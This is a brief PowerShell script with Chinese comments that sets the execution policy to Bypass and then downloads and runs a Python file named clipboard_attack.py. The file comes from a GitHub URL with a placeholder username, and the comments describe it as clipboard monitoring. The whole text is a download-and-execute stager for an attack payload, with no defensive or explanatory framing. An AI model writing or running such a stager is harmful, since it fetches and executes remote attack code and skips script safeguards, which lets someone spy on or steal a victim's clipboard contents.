# 设置执行策略为 ByPass
Set-ExecutionPolicy Bypass -Scope Process -Force

# 下载并执行剪贴板监控脚本
$scriptUrl = "https://raw.githubusercontent.com/你的GitHub用户名/clipboard-setup/main/clipboard_attack.py"
Invoke-WebRequest -Uri $scriptUrl -OutFile "$env:TEMP\clipboard_attack.py"
python $env:TEMP\clipboard_attack.py
